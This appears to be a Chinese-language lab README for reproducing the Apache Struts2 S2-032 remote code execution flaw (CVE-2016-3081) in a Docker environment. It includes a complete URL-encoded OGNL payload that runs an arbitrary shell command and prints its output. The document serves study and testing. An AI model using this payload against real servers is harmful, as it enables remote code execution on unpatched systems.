# S2-032 远程代码执行漏洞（CVE-2016-3081）

影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)

漏洞详情:

 - https://cwiki.apache.org/confluence/display/WW/S2-032
 - https://www.cnblogs.com/mrchang/p/6501428.html

## 漏洞环境

执行如下命令启动struts2 2.3.28：

```
docker-compose up -d
```

环境启动后，访问`http://your-ip:8080`即可看到默认页面。

## 漏洞复现

Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用`method:<name>`的方式来调用名字是`<name>`的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。

直接请求如下URL，即可执行`id`命令：

```
http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
```

![](1.png)
